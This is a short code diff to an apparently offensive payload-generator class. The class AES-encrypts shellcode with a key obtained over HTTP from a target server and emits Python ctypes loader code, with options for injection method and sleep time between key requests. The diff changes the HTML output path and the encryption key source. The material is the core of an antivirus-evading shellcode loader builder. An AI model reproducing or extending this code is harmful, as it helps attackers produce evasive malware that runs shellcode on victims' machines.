@@ -65,7 +65,7 @@ class Payload:
                                  "inject_method" : ["Virtual", "Virtual, Void, Heap"],
                                  "sleep_time" : ["60", "Set the sleep time between HTTP Key request"],
                                  "target_server" : ["http://www.guimp.com/", "Set target HTML server to query for decryption key"],
-                                 "html_file_name" : ["/root/Desktop/wordpress.html", "Set the output of HTML file name"]}
+                                 "html_file_name" : ["/root/wordpress.html", "Set the output of HTML file name"]}
 
         
         
@@ -274,7 +274,7 @@ class Payload:
                 f.close()
 
                 # encrypt the shellcode and grab the randomized key
-                (EncodedShellcode, secret) = encryption.encryptAES_http_request(Shellcode, self.required_options["target_server"][0])
+                (EncodedShellcode, secret) = encryption.encryptAES_http_request(Shellcode, html_data)
         
                 # Create Payload code
                 PayloadCode =  'import ctypes\n'
@@ -405,7 +405,7 @@ class Payload:
                 f.close()
 
                 # encrypt the shellcode and grab the randomized key
-                (EncodedShellcode, secret) = encryption.encryptAES_http_request(Shellcode, self.required_options["target_server"][0])
+                (EncodedShellcode, secret) = encryption.encryptAES_http_request(Shellcode, html_data)
         
                 # Create Payload code
                 PayloadCode = 'from ctypes import *\n'
